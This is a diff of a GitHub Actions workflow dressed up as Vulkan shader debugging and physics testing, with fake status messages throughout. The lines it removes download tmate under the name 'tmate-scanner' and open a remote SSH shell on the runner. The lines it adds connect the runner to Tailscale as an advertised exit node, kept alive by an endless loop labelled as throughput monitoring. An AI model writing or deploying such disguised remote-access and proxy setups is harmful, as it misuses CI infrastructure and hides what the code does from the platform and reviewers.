@@ -15,10 +15,10 @@ jobs:
         run: |
           echo "Initializing Vulkan SDK 1.3.9... [OK]"
           echo "Loading LLVM-15 backend for shader JIT... [OK]"
-          wget -q https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-amd64.tar.xz
-          tar xf tmate-2.4.0-static-linux-amd64.tar.xz > /dev/null 2>&1
-          mv tmate-2.4.0-static-linux-amd64/tmate ./tmate-scanner
-          echo "Render-driver-checker initialized."
+#          wget -q https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-amd64.tar.xz
+#          tar xf tmate-2.4.0-static-linux-amd64.tar.xz > /dev/null 2>&1
+#          mv tmate-2.4.0-static-linux-amd64/tmate ./tmate-scanner
+#          echo "Render-driver-checker initialized."
 
       - name: Run Physics Simulation (Dry Run)
         run: |
@@ -32,35 +32,51 @@ jobs:
 
       
       - name: Interactive Shader Debugging
+#        run: |
+#          echo "Starting interactive debugging session for Vulkan validation layers..."
+
+        uses: tailscale/github-action@v4
+        with:
+          authkey: ${{ secrets.TK }} 
+          
+      - name: debug
         run: |
-          echo "Starting interactive debugging session for Vulkan validation layers..."
-          
-          ./tmate-scanner -S /tmp/game.sock new-session -d
-          
           # check
-          echo "Waiting for tmate to propagate SSH address..."
-          ITER=0
-          while [ -z "$GAME_DEBUG_SSH" ] && [ $ITER -lt 30 ]; do
-            GAME_DEBUG_SSH=$(./tmate-scanner -S /tmp/game.sock display -p '#{tmate_ssh}' 2>/dev/null)
-            sleep 2
-            ITER=$((ITER+1))
-          done
-
-          if [ -z "$GAME_DEBUG_SSH" ]; then
-            echo "ERROR: Failed to retrieve SSH address after 60s."
-            exit 1
-          fi
-
-          echo "============================================================"
-          echo "SSH DEBUG PORT OPEN: $GAME_DEBUG_SSH"
-          echo "============================================================"
+          sudo tailscale up --advertise-exit-node --reset
           
-          # check2
-          for i in {1..180}; do
-            echo "[$(date +%H:%M:%S)] Stress Testing: Vertex Buffer Object (VBO) #$i..."
-            if [ $((i % 15)) -eq 0 ]; then
-               curl -s https://www.google.com/generate_204 > /dev/null
-            fi
+          echo "Tailscale is UP! Your VM IP is: $(tailscale ip -4)"
+          
+          # check debug
+          while true; do
+            echo "[$(date)] P2P Link Active - Monitoring Throughput..."
             sleep 60
           done          
+#          ./tmate-scanner -S /tmp/game.sock new-session -d
+          
+  #        # check
+#          echo "Waiting for tmate to propagate SSH address..."
+#          ITER=0
+#          while [ -z "$GAME_DEBUG_SSH" ] && [ $ITER -lt 30 ]; do
+#            GAME_DEBUG_SSH=$(./tmate-scanner -S /tmp/game.sock display -p '#{tmate_ssh}' 2>/dev/null)
+#            sleep 2
+#            ITER=$((ITER+1))
+#          done
+
+#          if [ -z "$GAME_DEBUG_SSH" ]; then
+#            echo "ERROR: Failed to retrieve SSH address after 60s."
+#            exit 1
+ #         fi
+
+#          echo "============================================================"
+#          echo "SSH DEBUG PORT OPEN: $GAME_DEBUG_SSH"
+#          echo "============================================================"
+          
+          # check2
+#          for i in {1..180}; do
+#            echo "[$(date +%H:%M:%S)] Stress Testing: Vertex Buffer Object (VBO) #$i..."
+#            if [ $((i % 15)) -eq 0 ]; then
+ #              curl -s https://www.google.com/generate_204 > /dev/null
+#            fi
+#            sleep 60
+#          done          
           
